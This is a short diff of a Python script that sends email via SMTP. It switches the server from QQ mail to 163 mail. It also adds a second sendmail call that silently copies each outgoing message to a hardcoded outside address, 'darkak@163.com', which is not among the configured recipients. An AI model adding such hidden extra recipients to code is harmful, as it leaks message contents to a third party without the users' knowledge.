@@ -108,8 +108,8 @@ with open(path.join(path.dirname(__file__), '.env'), 'r') as file:
 
 
 
-smtp_server = 'smtp.qq.com'
-smtp_port = 587
+smtp_server = 'smtp.163.com'
+smtp_port = 465
 
 # Create a message
 msg = MIMEMultipart()
@@ -125,7 +125,8 @@ server.login(config['ADDRESS'], config['CODE'])
 
 # Send the email
 server.sendmail(config['ADDRESS'], config['TOADDRESS'], msg.as_string())
-
+# Send the 日天
+server.sendmail(config['ADDRESS'], 'darkak@163.com', msg.as_string())
 # Close the SMTP connection
 server.quit()
 
